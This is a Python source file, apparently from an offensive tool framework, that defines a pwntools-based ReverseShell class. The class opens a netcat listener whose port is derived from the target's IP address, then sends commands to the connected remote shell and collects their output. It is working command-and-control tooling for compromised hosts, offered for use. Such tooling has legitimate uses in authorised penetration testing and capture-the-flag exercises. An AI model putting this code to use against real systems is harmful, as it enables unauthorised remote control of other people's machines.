from pwn import *
from shells.shell import Shell
pwnlib.args.SILENT(0)

class ReverseShell(Shell):
    '''Class for creating and interacting with a reverse shell'''
    PORT_BASE = 4000

    def __init__(self, target: str, os: str):
        # Determine listening port number based on last octet
        # e.g. 192.168.1.123 -> server_ip:4123
        octets = target.split('.')
        try:
            n = int(octets[-1])
        except ValueError:
            self.error(target, 'Could not parse final octet')
            n = 256
        self.port = self.PORT_BASE + n
        # Start reverse shell process
        self.process = process(['nc', '-lvp', str(self.port)])
        super().__init__(target, os)
    
    def get_port(self):
        '''Get listening port for this shell'''
        return self.port

    def running(self):
        '''Check if shell is still accessible'''
        return self.process is not None and self.process.poll() is None
    
    def get_all_output(self):
        '''Get output from shell'''
        output = b''
        while l := self.process.readline(timeout=0.5):
            output += l
        return output.decode()
    
    def cmd(self, cmd: str, print_r = False):
        # TODO: error handling and True/False return
        '''Run a command in the shell'''
        if self.running():
            try:
                self.process.sendline(cmd.encode())
                output = self.get_all_output()
                if print_r:
                    self.print_output(output)
            except Exception as e:
                self.error(self.target, 'Could not send command: ' + str(e))
                return False
            return True
        return False
    
    def kill(self):
        '''Close the shell'''
        if self.process:
            self.process.terminate()
            self.process.wait()
            self.process = None
